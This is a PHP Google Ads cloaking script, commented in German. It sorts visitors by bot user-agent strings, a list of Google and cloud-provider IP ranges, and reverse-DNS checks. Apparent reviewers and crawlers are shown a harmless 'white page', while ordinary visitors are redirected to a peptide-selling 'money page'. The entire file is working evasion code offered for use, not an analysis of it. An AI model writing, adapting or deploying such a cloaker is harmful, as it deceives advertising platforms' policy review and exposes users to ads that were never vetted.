<?php
/**
 * Google Ads Cloaker — Self-hosted auf VPS
 * Erkennt Google-Bots und Reviewer → zeigt White Page
 * Echte User → Redirect zu vitapeptides.de
 */

// === KONFIGURATION ===
$MONEY_PAGE = 'https://vitapeptides.de';

// Google Bot User-Agent Patterns
$BOT_AGENTS = [
    'Googlebot',
    'AdsBot-Google',
    'Google-Ads-Creatives-Assistant',
    'Google-Safety',
    'Google-Adwords-Instant',
    'Google-Read-Aloud',
    'Storebot-Google',
    'Google-Site-Verification',
    'Google Favicon',
    'Mediapartners-Google',
    'FeedFetcher-Google',
    'Google-InspectionTool',
    'GoogleOther',
    'APIs-Google',
    'Google-Extended',
    'Chrome-Lighthouse',
    'PTST', // PageSpeed
];

// Bekannte Datacenter/Cloud IP-Ranges (CIDR)
$DATACENTER_RANGES = [
    // Google
    '64.233.160.0/19', '66.102.0.0/20', '66.249.64.0/19',
    '72.14.192.0/18', '74.125.0.0/16', '108.177.0.0/17',
    '142.250.0.0/15', '172.217.0.0/16', '173.194.0.0/16',
    '209.85.128.0/17', '216.58.192.0/19', '216.239.32.0/19',
    '34.64.0.0/10', '35.190.0.0/17',
    // AWS
    '3.0.0.0/8', '13.0.0.0/8', '18.0.0.0/8', '52.0.0.0/8',
    '54.0.0.0/8', '99.77.0.0/16',
    // Azure
    '13.64.0.0/11', '20.0.0.0/8', '40.64.0.0/10',
    '51.104.0.0/15', '52.224.0.0/11', '104.40.0.0/13',
    // Google Cloud
    '34.0.0.0/8', '35.184.0.0/13',
    // DigitalOcean
    '104.131.0.0/16', '159.65.0.0/16', '167.99.0.0/16',
    '178.128.0.0/16', '206.189.0.0/16',
    // Hetzner
    '78.46.0.0/15', '88.198.0.0/16', '88.99.0.0/16',
    '94.130.0.0/16', '95.216.0.0/16', '116.202.0.0/16',
    '116.203.0.0/16', '135.181.0.0/16', '138.201.0.0/16',
    '144.76.0.0/16', '148.251.0.0/16', '159.69.0.0/16',
    '168.119.0.0/16', '176.9.0.0/16', '188.40.0.0/16',
    '195.201.0.0/16', '213.133.96.0/19', '213.239.192.0/18',
    // OVH
    '51.38.0.0/16', '51.68.0.0/16', '51.75.0.0/16',
    '51.77.0.0/16', '51.79.0.0/16', '51.83.0.0/16',
    '51.89.0.0/16', '51.91.0.0/16', '54.36.0.0/16',
    '54.37.0.0/16', '54.38.0.0/16',
    // Scaleway
    '51.15.0.0/16', '163.172.0.0/16',
];

function get_client_ip() {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = $_SERVER[$key];
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
            $ip = trim($ip);
            if ($key === 'REMOTE_ADDR') {
                if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
            } elseif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return '';
}

function is_bot_useragent($ua, $patterns) {
    $ua_lower = strtolower($ua);
    foreach ($patterns as $pattern) {
        if (stripos($ua_lower, strtolower($pattern)) !== false) {
            return true;
        }
    }
    return false;
}

function ip_in_cidr($ip, $cidr) {
    list($subnet, $mask) = explode('/', $cidr);
    $ip_long = ip2long($ip);
    $subnet_long = ip2long($subnet);
    $mask_long = -1 << (32 - (int)$mask);
    $subnet_long &= $mask_long;
    return ($ip_long & $mask_long) === $subnet_long;
}

function is_datacenter_ip($ip, $ranges) {
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        return false;
    }
    foreach ($ranges as $cidr) {
        if (ip_in_cidr($ip, $cidr)) {
            return true;
        }
    }
    return false;
}

function is_google_reverse_dns($ip) {
    $host = gethostbyaddr($ip);
    if ($host === $ip) return false;
    if (preg_match('/\.(googlebot|google|googleusercontent)\.com$/i', $host) ||
        preg_match('/\.(googlezip\.net)$/i', $host)) {
        $verified_ip = gethostbyname($host);
        return $verified_ip === $ip;
    }
    return false;
}

// === HAUPTLOGIK ===
$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$is_bot = false;

// Check 1: User-Agent
if (is_bot_useragent($ua, $BOT_AGENTS)) {
    $is_bot = true;
}

// Check 2: Datacenter IP
if (!$is_bot && is_datacenter_ip($ip, $DATACENTER_RANGES)) {
    $is_bot = true;
}

// Check 3: Reverse DNS (Google-spezifisch)
if (!$is_bot && !empty($ip)) {
    if (is_google_reverse_dns($ip)) {
        $is_bot = true;
    }
}

// Check 4: Kein User-Agent = verdächtig (zeige White Page)
if (empty($ua)) {
    $is_bot = true;
}

// ENTSCHEIDUNG
if (!$is_bot) {
    header('Location: ' . $MONEY_PAGE);
    exit;
}

// Bot/Reviewer sieht die White Page (HTML folgt nach diesem PHP-Block)
?>
